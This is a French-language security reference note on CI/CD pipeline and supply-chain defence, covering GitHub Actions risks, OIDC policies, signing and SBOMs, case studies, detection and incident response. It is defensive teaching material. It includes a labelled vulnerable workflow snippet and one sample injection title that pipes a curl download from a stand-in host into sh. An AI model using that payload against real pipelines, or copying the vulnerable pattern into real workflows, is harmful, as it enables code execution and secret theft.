# Sécurité CI-CD et chaîne d'approvisionnement

Pendant longtemps, le pipeline d'intégration continue fut considéré comme un simple accélérateur de livraison. Il est devenu le composant le plus privilégié du système d'information : il lit le code source, détient des jetons d'écriture sur les dépôts, parle aux registres d'images, possède des credentials cloud et signe les binaires que les clients installent. Un attaquant qui compromet un serveur applicatif obtient une application ; un attaquant qui compromet le pipeline obtient un artefact signé, distribué et approuvé par la victime elle-même. La sécurité CI/CD n'est donc plus un sujet d'outillage mais un sujet d'architecture de confiance.

Cette note décrit le pipeline comme un système à part entière, recense les chemins d'attaque qui le traversent et détaille les contrôles qui rendent une compromission détectable et réversible. Elle prolonge [[Supply Chain Attacks]] en se concentrant sur la défense du chemin entre le commit et la production, dans le cadre du [[Secure SDLC]], avec [[Gestion des clés et HSM]] pour la signature.

> [!abstract] Définition — Provenance
> La **provenance** est une métadonnée signée qui décrit l'origine d'un artefact : quel dépôt, quel commit, quel fichier de build, quels paramètres, quel builder, à quel moment. Elle ne dit pas que l'artefact est sûr, elle dit qu'il a été produit par tel processus à partir de telles entrées. Vérifiée à la consommation, elle transforme l'affirmation « ce binaire vient bien de notre CI » en une preuve contrôlable, et permet de détecter un artefact reconstruit hors pipeline.

## Architecture d'une chaîne CI/CD

Une chaîne moderne comporte six zones fonctionnelles, chacune avec sa propre surface d'attaque. Les confondre conduit à placer des contrôles au mauvais endroit.

```mermaid
flowchart LR
    DEV["Développeur\nposte de travail"] -->|"push, pull request"| SCM["SCM\nGitHub, GitLab"]
    SCM -->|"webhook, job"| CI["Orchestrateur\nworkflow, pipeline"]
    CI --> RUN["Runners\nhébergés ou autohébergés"]
    CI --> SEC["Coffre de secrets\nVault, KMS, OIDC"]
    SEC -->|"credentials temporaires"| RUN
    RUN -->|"artefacts, images"| REG["Registre\npackages, conteneurs"]
    REG -->|"pull, vérification"| DEP["Déploiement\nKubernetes, VM, serverless"]
    DEP --> PROD["Production"]
    RUN -->|"attestation de provenance"| REG
```



Le **SCM** porte la vérité du code et l'historique des revues. L'**orchestrateur** décide quels jobs s'exécutent, avec quelles permissions et dans quel contexte de déclenchement. Les **runners** exécutent du code arbitraire : ce sont, de fait, des environnements d'exécution de code non fiable. Le **coffre de secrets** distribue des credentials, le **registre** conserve les artefacts et devient la cible d'attaques par substitution, le **déploiement** est le point où un artefact non vérifié devient un incident de production.

Deux propriétés structurent la sécurité de l'ensemble : l'**identité de charge de travail**, par laquelle chaque job s'authentifie avec des credentials de courte durée fédérés par OIDC plutôt que par un secret statique partagé, et la **séparation des privilèges**, qui interdit au job de build de déployer et au job de déploiement de modifier le code.

## Menaces contre le pipeline

Le pipeline est un *confused deputy* : il détient des droits que l'auteur d'une contribution ne possède pas, et il les exerce pour le compte de cet auteur. Toute la menace tient dans cet écart.

| Menace | Mécanisme | Effet |
|---|---|---|
| Empoisonnement de pipeline | Modification d'un fichier de workflow exécuté par la CI | Exécution de code dans le runner avec les secrets du job |
| Injection de script | Interpolation d'une entrée non fiable dans un bloc `run` | Exécution de commandes arbitraires, exfiltration de jetons |
| `pull_request_target` | Workflow privilégié déclenché par une PR de fork, avec checkout du code de la PR | Accès aux secrets et au jeton d'écriture depuis du code non revu |
| `workflow_run` | Workflow privilégié déclenché après un workflow non privilégié, consommant ses artefacts | Élévation de privilèges par artefact piégé |
| Empoisonnement de cache | Écriture d'une entrée de cache depuis une branche non protégée, restaurée ensuite sur la branche principale | Substitution de dépendances ou de binaires compilés |
| Dependency confusion | Publication publique d'un nom de paquet interne avec une version supérieure | Installation du paquet attaquant dans le build |
| Typosquatting | Nom de paquet visuellement proche d'un paquet légitime | Exécution d'un script d'installation malveillant |
| Mainteneur compromis | Prise de contrôle d'un compte de publication légitime | Mise à jour malveillante signée par le registre |
| Empoisonnement d'artefact | Remplacement d'une image ou d'un paquet dans le registre | Déploiement d'un binaire non construit par la CI |
| Fuite de secret | Secret en clair dans un log, un artefact, une variable ou l'historique Git | Accès direct aux ressources de production |
| Runner autohébergé persistant | Runner non éphémère, réutilisé entre jobs et entre branches | Persistance, vol de credentials, mouvement latéral |
| OIDC mal configuré | Politique de confiance acceptant un périmètre trop large | Prise de rôle cloud depuis n'importe quel dépôt ou branche |

### Injection dans les workflows GitHub Actions

Trois contextes se confondent souvent. Le premier est l'interpolation directe d'une donnée contrôlée par l'attaquant dans un bloc `run`, qui produit une injection de shell : titre d'issue, nom de branche, corps de PR et message de commit sont tous contrôlables.

```yaml
# Vulnérable : le titre de l'issue est concaténé dans le script
- name: Accuser réception
  run: echo "Nouvelle issue : ${{ github.event.issue.title }}"
```

Un titre contenant `"; curl https://exemple.invalid/x | sh; #` s'exécute dans le runner. La correction consiste à passer la valeur par une variable d'environnement, que le shell traite comme une donnée et non comme du code.

```yaml
- name: Accuser réception
  env:
    TITRE: ${{ github.event.issue.title }}
  run: printf 'Nouvelle issue : %s\n' "$TITRE"
```

Le deuxième contexte est `pull_request_target`. Ce déclencheur exécute le workflow dans le contexte de la branche de base, avec accès aux secrets et à un `GITHUB_TOKEN` en écriture, tout en étant déclenché par une PR de fork. Le combiner avec un checkout de `github.event.pull_request.head.sha` revient à donner les secrets au code de l'attaquant. La variante `pull_request` est sûre par construction : elle n'expose ni secrets ni jeton d'écriture.

Le troisième contexte est `workflow_run`. Un workflow privilégié qui se déclenche après un workflow non privilégié et télécharge ses artefacts hérite du contenu hostile produit par la PR. L'artefact doit être traité comme une entrée non fiable : validation de schéma, vérification de taille, aucune exécution directe.

> [!warning] Piège
> Épingler une action tierce par tag (`@v4`) ne protège pas contre la réassignation du tag par le mainteneur de l'action. Le tag est un pointeur mutable ; seul le condensat SHA complet identifie un contenu immuable. La même logique s'applique aux images de conteneur, qui doivent être référencées par digest et non par tag.

### Empoisonnement de cache et d'artefacts

`actions/cache` crée des entrées identifiées par une clé et un préfixe de restauration. La portée dépend de l'outil et du contexte : un job exécuté dans le contexte de la branche de base (`pull_request_target`) ou un cache partagé entre runners peut écrire une entrée que la branche principale restaurera, par exemple un répertoire de dépendances ou de build. Le job suivant réutilise alors des binaires choisis par l'attaquant sans les recompiler. Les parades sont l'isolation des caches par branche et par contexte, l'interdiction d'écriture depuis les forks, et la vérification d'intégrité des artefacts restaurés.

Le même raisonnement vaut pour les registres : un artefact doit être accompagné d'un condensat et d'une attestation vérifiés au déploiement, sans quoi quiconque obtient un droit d'écriture peut substituer une image.

### OIDC et politiques de confiance

La fédération OIDC supprime les clés statiques : le runner présente un jeton signé par la plateforme, le fournisseur cloud l'échange contre des credentials temporaires. Le bénéfice dépend entièrement de la politique de confiance du rôle.

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" },
      "StringLike": {
        "token.actions.githubusercontent.com:sub":
          "repo:mon-org/mon-app:environment:production"
      }
    }
  }]
}
```

Une condition `repo:mon-org/*` autorise n'importe quel dépôt de l'organisation, y compris celui qu'un attaquant crée s'il obtient un droit de création ; une condition sur `ref:refs/heads/*` autorise n'importe quelle branche, donc une branche de PR. Il faut conditionner sur l'environnement protégé ou une branche nommée, et sur l'audience. La fédération ne remplace pas l'autorisation : le rôle assumé doit lui-même être à privilège minimal.

### Runners autohébergés

Un runner autohébergé qui persiste entre les jobs conserve l'état du job précédent : fichiers temporaires, caches de credentials, configurations cloud, parfois des sockets Docker. Une PR non fiable peut y déposer un binaire ou une persistance qui s'exécutera lors du build de la branche principale. Les runners doivent être éphémères, recréés depuis une image immuable pour chaque job, et isolés par niveau de confiance : un runner partagé entre PR publiques et builds de release est un pont vers les secrets de production.

## Défenses structurelles

Les contrôles se répartissent en trois couches : ce qui entre dans le pipeline, ce que le pipeline peut faire, et ce qui en sort.

**Épinglage et intégrité des dépendances.** Les actions et les images se référencent par condensat, les dépendances applicatives se verrouillent par fichier de lock avec vérification des hachages. Un registre mandataire filtre les sources autorisées et bloque les paquets publiés depuis moins de quelques jours, ce qui neutralise une partie des attaques par publication rapide.

**Moindre privilège.** Le `GITHUB_TOKEN` se déclare explicitement, par défaut en lecture seule, et s'élève job par job. Les permissions `id-token: write` et `contents: write` ne doivent jamais coexister sur un job qui exécute du code de PR.

```yaml
name: build
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          persist-credentials: false
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
        with:
          node-version: "22"
      - run: npm ci --ignore-scripts
      - run: npm test

  publish:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-24.04
    environment: production
    permissions:
      contents: read
      id-token: write
      packages: write
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          persist-credentials: false
      - run: npm ci --ignore-scripts
      - run: npm run build
      - uses: sigstore/cosign-installer@f713795cb21599bc4e5c4b58cbad1da852d7eeb9
      - run: cosign sign-blob --yes dist/app.tar.gz --bundle dist/app.sigstore.json
```

**Environnements protégés et revue.** Un environnement de déploiement adossé à une approbation manuelle et à une liste de branches autorisées empêche un job compromis de publier seul. `CODEOWNERS` sur `.github/workflows/` impose une revue par l'équipe sécurité lorsqu'un pipeline change. Protection de branche, règles de fusion et interdiction de force-push complètent le dispositif ; sans elles, un attaquant disposant d'un accès en écriture modifie le workflow et attend la fusion.

**Identité et secrets.** Aucun secret statique dans les variables de dépôt : les secrets vivent dans un coffre, sont distribués à la demande avec une durée de vie courte et sont liés à une identité de charge de travail. Les secrets de publication de paquets se distinguent de ceux du déploiement, et les clés de signature restent dans un HSM ou un KMS non exportable, comme décrit dans [[Gestion des clés et HSM]].

## Provenance, SBOM et signatures

Trois artefacts rendent la chaîne vérifiable : la liste des composants, l'attestation de construction et la signature.

| Niveau SLSA (build, v1.0) | Garantie | Ce qu'il faut mettre en place |
|---|---|---|
| 1 | Provenance générée automatiquement | Le build produit un fichier de provenance, sans garantie de fidélité |
| 2 | Provenance signée par le service de build | Build hébergé, signature par le builder, authenticité du dépôt |
| 3 | Provenance non falsifiable | Isolation du build, secrets inaccessibles au build, journaux auditables |

Le niveau 3 est le seuil utile pour la plupart des organisations : il rend une compromission du build détectable.

Une **SBOM** énumère les composants d'un artefact, leurs versions et leurs relations de dépendance. SPDX et CycloneDX sont les formats de référence, CycloneDX étant le plus répandu pour les images de conteneur. La SBOM ne protège pas, elle rend interrogeable : lors d'une CVE critique, elle répond en minutes à la question « quels produits embarquent ce composant ». Le **VEX** documente, pour chaque vulnérabilité, si le produit est réellement affecté, ce qui évite de traiter des milliers de faux positifs hérités de dépendances transitives non exploitables.

```bash
# Générer une SBOM CycloneDX à partir d'une image
syft registry.exemple.com/app:1.4.2 -o cyclonedx-json > sbom.json

# Signer l'image et l'attestation de provenance
cosign sign --yes registry.exemple.com/app@sha256:3f2c...
cosign attest --yes --predicate provenance.json \
  --type slsaprovenance registry.exemple.com/app@sha256:3f2c...

# Vérifier avant déploiement : identité du signataire et provenance
cosign verify registry.exemple.com/app@sha256:3f2c... \
  --certificate-identity-regexp '^https://github.com/mon-org/mon-app/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

**in-toto** formalise la chaîne : un fichier de mise en page décrit les étapes autorisées et les artefacts produits et consommés par chacune, et chaque étape émet une liaison signée. Le vérificateur rejoue la mise en page et refuse tout artefact dont la chaîne est incomplète. C'est le modèle qui prouve qu'un binaire a traversé les étapes prévues, dans l'ordre prévu, et non seulement qu'il porte une signature valide.

## Études de cas

**SolarWinds (2020).** L'attaquant compromet le système de build d'Orion et insère du code avant compilation. Le binaire produit est signé par le certificat légitime de l'éditeur, puis distribué à environ dix-huit mille clients. La leçon n'est pas que la signature est inutile, mais qu'elle atteste du pipeline et non de la sûreté du code : la compromission se situe en amont de la signature. D'où l'importance de l'isolation du build et de la provenance.

**Codecov (2021).** Le script d'upload, téléchargé et exécuté à chaque build par des milliers de clients, est modifié pour exfiltrer les variables d'environnement, dont les credentials de CI. Le vecteur est la dépendance d'exécution non épinglée : un `curl | bash` dans un job est un canal de mise à jour distant sans contrôle d'intégrité.

**3CX (2023).** La compromission d'un build Windows aboutit à un installeur signé contenant une porte dérobée, distribué aux clients de l'éditeur. L'attaque illustre la contamination en cascade : un premier fournisseur compromis fournit le vecteur d'accès au build du second, qui livre à son tour des victimes en aval.

**xz / liblzma (2024, CVE-2024-3094).** Un mainteneur obtient la confiance du projet, puis introduit dans les archives de release un code d'obfuscation absent du dépôt Git, activé à l'édition de liens. La leçon porte sur la différence entre ce qui est revu et ce qui est construit : une revue limitée au dépôt ne voit pas les fichiers générés.

## Détection

La compromission d'un pipeline se lit dans les journaux d'audit et de build, rarement dans les journaux applicatifs.

| Signal | Source | Interprétation |
|---|---|---|
| Modification de fichier de workflow hors revue | Audit log SCM, diff de PR | Tentative d'empoisonnement de pipeline |
| Changement de permission ou de politique de confiance OIDC | Audit cloud, journaux IAM | Élévation de privilèges |
| Job lancé depuis une branche ou un fork inattendu | Journaux CI | Injection ou `pull_request_target` mal configuré |
| Téléchargement réseau sortant depuis un runner | Journaux réseau, EDR du runner | Exfiltration de secrets |
| Nouveau secret utilisé depuis une IP inconnue | CloudTrail, journaux du coffre | Fuite de credentials |
| Artefact dont le condensat diffère du build attendu | Registre, vérification cosign | Substitution d'artefact |
| Nouvelle dépendance transitive non verrouillée | Diff de SBOM, SCA | Compromission de dépendance |
| Publication d'un paquet au nom proche d'un paquet interne | Veille registre | Typosquatting ou dependency confusion |

Les journaux d'audit GitHub et GitLab conservent les changements de permission, les créations de jeton, les modifications de protection de branche et les exécutions de workflow. Ils doivent être exportés vers le SIEM et corrélés aux journaux cloud, comme décrit dans [[Detection Engineering]] et [[SIEM (Security Information and event Management)]]. Une requête utile cible toute exécution dont l'acteur n'est pas un mainteneur attendu. Ces signaux complètent les analyses de code et de dépendances décrites dans [[SAST, DAST et SCA]].

```bash
# Vérifier la provenance d'une image avant admission
cosign verify-attestation --type slsaprovenance \
  --certificate-identity-regexp '^https://github.com/mon-org/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  registry.exemple.com/app@sha256:3f2c...

# Comparer deux SBOM et isoler les composants apparus
diff <(jq -r '.components[].purl' sbom-avant.json | sort) \
     <(jq -r '.components[].purl' sbom-apres.json | sort)
```

Une politique d'admission Kubernetes peut refuser toute image non signée ou dont l'attestation ne correspond pas au builder attendu ; c'est le point où la provenance devient un contrôle technique et non un document. Voir [[Kubernetes Security]] pour l'implémentation des politiques d'admission.

**Limites.** Un attaquant qui contrôle l'orchestrateur produit une provenance parfaitement valide : la signature prouve la cohérence, pas l'absence de compromission du builder. La SBOM décrit ce que le build déclare, pas ce que le binaire contient. Ces contrôles déplacent l'effort de l'attaquant et rendent certaines attaques détectables, ils ne les rendent pas impossibles.

> [!quiz] Pourquoi `pull_request_target` avec un checkout du code de la PR est-il dangereux, alors que `pull_request` ne l'est pas ?
> Parce que `pull_request_target` s'exécute dans le contexte de la branche de base : il dispose des secrets du dépôt et d'un jeton en écriture, tout en étant déclenché par une PR de fork. Si le workflow fait ensuite un checkout du head de la PR, ce code non revu s'exécute avec ces privilèges. `pull_request` s'exécute dans le contexte de la PR, sans secrets et avec un jeton en lecture seule : le code hostile peut s'exécuter, mais il n'a rien à voler.

> [!quiz] Une image signée par cosign est-elle nécessairement saine ?
> Non. La signature atteste qu'une identité donnée a signé ce condensat, et l'attestation de provenance qu'un builder donné l'a produit à partir d'entrées données. Si le builder est compromis ou si l'identité de signature est volée, la signature reste valide. La vérification doit porter sur l'identité, l'émetteur OIDC et le contenu de la provenance, pas sur l'existence d'une signature.

## Réponse à incident

La réponse à une compromission de pipeline suit une séquence propre, parce que tous les artefacts produits pendant la fenêtre doivent être considérés comme suspects.

1. **Geler** les déploiements, désactiver les workflows concernés et révoquer les jetons d'organisation émis par la CI.
2. **Délimiter** la fenêtre de compromission à partir des journaux d'audit et des exécutions de build, puis identifier les artefacts construits pendant cette fenêtre.
3. **Révoquer** les secrets exposés — clés cloud, jetons de publication, clés de signature — et faire tourner ceux dont l'usage n'est pas traçable. Une clé de signature compromise impose un avis de révocation et une re-signature depuis une base saine.
4. **Reconstruire** depuis un commit vérifié, sur un runner neuf, avec des dépendances réinstallées depuis les fichiers de lock. Ne jamais « nettoyer » un artefact produit pendant la fenêtre.
5. **Publier** une SBOM corrigée et, le cas échéant, un VEX documentant l'impact réel, puis ajouter le chemin d'attaque au modèle de menace et étendre la détection.

Un artefact dont la provenance n'est pas prouvable doit être traité comme compromis : l'absence de preuve n'est pas une preuve d'intégrité.
